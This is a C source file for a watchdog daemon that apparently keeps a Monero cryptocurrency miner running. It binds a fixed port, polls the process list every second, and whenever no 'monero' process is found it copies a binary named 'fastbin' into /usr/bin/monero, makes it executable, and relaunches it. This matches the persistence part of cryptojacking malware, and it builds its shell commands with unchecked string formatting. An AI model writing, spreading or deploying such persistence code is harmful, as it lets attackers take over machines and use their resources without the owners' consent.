#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>

int init(void) {
    int optval = 1;
    int listen_fd;
    struct sockaddr_in addr;
    
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    (void)setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(22350);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    if (bind(listen_fd, (struct sockaddr *)(void *)&addr, sizeof(struct sockaddr_in)) < 0) {   
        syslog(LOG_WARNING, "[MONERO] daem0n start failed: %s", strerror(errno));
        return -1;
    }
    
    return 0;
}

int detect_process(char *process_name)
{  
    FILE *ptr;
    char buff[512];
    char ps[128];

    sprintf(ps, "ps -e | grep -c %s", process_name);
    strcpy(buff, "ABNORMAL");
        
    if ((ptr = popen(ps, "r")) != NULL) {  
        while (fgets(buff, 512, ptr) != NULL) {  
            if (atoi(buff)>=1) {  
                pclose(ptr);
                return 0;
            }  
        }  
    }
        
    if (strcmp(buff,"ABNORMAL")==0) {
        return 1;
    }
    
    pclose(ptr);
    return 1;
}  

int main(int argc, char *argv[]) {
    int ret;
    
    ret = init();
    if (ret < 0) {
        return -1;
    }
    
    while (1) {
        if (0 != detect_process("monero")) {
            syslog(LOG_WARNING, "[DAEM0N] monero stopped");

            if (0 != access("/usr/bin/monero", 0)) {
                syslog(LOG_WARNING, "[DAEM0N] monero do not exist");
                system("cp /usr/bin/fastbin /usr/bin/monero");
            }

            system("chmod a+x /usr/bin/monero");
            system("monero &");
        } else {
            syslog(LOG_WARNING, "[DAEM0N] monero already started");
        }

        sleep(1);
    }

    return 0;
}
